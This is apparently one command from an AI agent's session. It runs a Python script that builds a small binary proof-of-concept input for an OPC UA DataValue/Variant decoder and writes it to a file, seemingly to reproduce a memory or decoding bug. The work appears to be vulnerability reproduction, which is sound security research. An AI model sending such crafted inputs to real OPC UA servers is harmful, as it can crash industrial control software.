Running command: python3 << 'EOF'
import struct

# typeIndex = 22 (UA_TYPES_DATAVALUE)
type_index = struct.pack('<H', 22)

# DataValue encoding mask: 0x01 (hasValue)
dv_mask = b'\x01'

# Variant encoding byte: array(0x80) | dimensions(0x40) | type_id
# Type Byte = typeIndex 2, encoded as 3
variant_enc = bytes([0x80 | 0x40 | 0x03])

# Array length: 1
array_len = struct.pack('<i', 1)

# Array data: 1 byte
array_data = b'\x41'

# Dimensions length: 1 (Int32)
dim_len = struct.pack('<i', 1)

# Dimensions data: 1 UInt32
dim_data = struct.pack('<I', 1)

# Combine the DataValue binary
datavalue = dv_mask + variant_enc + array_len + array_data + dim_len + dim_data

# Memory limit - try 200 first
mem_limit = struct.pack('<I', 200)

poc = type_index + datavalue + mem_limit

print(f"PoC length: {len(poc)} bytes")
print(f"Hex: {poc.hex()}")

with open('/workspace/poc1.bin', 'wb') as f:
    f.write(poc)
    
print("Written to /workspace/poc1.bin")
EOF
